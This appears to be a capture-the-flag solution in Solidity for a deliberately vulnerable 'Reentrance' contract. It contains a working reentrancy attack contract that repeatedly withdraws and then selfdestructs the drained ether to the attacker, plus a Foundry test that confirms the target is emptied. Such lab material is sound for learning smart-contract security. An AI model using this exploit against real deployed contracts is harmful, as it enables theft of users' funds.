// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

interface IReentrance {
  function withdraw(uint _amount) external;

  function donate(address _to) external payable;

  function balanceOf(address _who) external view returns (uint);
}

contract ReentrancyHack {
  IReentrance reentrance;

  constructor(address _reentrance) public {
    reentrance = IReentrance(_reentrance);
  }

  receive() external payable {
    if (reentrance.balanceOf(address(this)) >= 1 ether) {
      reentrance.withdraw(1 ether);
    }
  }

  function donate() external payable {
    reentrance.donate.value(msg.value)(address(this));
  }

  function withdraw(uint _amount) external {
    reentrance.withdraw(_amount);
  }

  function killMe(address _to) external {
    selfdestruct(payable(_to));
  }
}

pragma solidity ^0.6.0;

import {LevelFactory} from "../utils/LevelFactory.sol";
import {Reentrance} from "../../src/Reentrancy/Level.sol";

interface IReentrancyHack {
  function donate() external payable;

  function killMe(address _to) external;

  function withdraw(uint _amount) external;
}

contract ReentrancyTest is LevelFactory {
  IReentrance reentrance;

  function setUp() public {
    vm.prank(deployer); // deploy the contract as deployer
    vm.deal(deployer, 11 ether);
    reentrance = IReentrance(address(new Reentrance()));
    reentrance.donate.value(10 ether)(deployer);
    assert(address(reentrance).balance == 10 ether);
  }

  function testAttack() public {
    submitLevel("Reentrance");
  }

  function _performTest() internal override {
    IReentrancyHack reentrancyHack = IReentrancyHack(address(new ReentrancyHack(address(reentrance))));
    reentrancyHack.donate.value(1 ether)();
    reentrancyHack.withdraw(1 ether);
    reentrancyHack.killMe(attacker);
  }

  function _setupTest() internal override {
    vm.startPrank(attacker);
    vm.deal(attacker, 5 ether);
  }

  function _checkTest() internal override returns (bool) {
    assertEq(address(reentrance).balance, 0);
    assertGe(attacker.balance, 10 ether);

    return (address(reentrance).balance == 0 && attacker.balance >= 10 ether);
  }
}

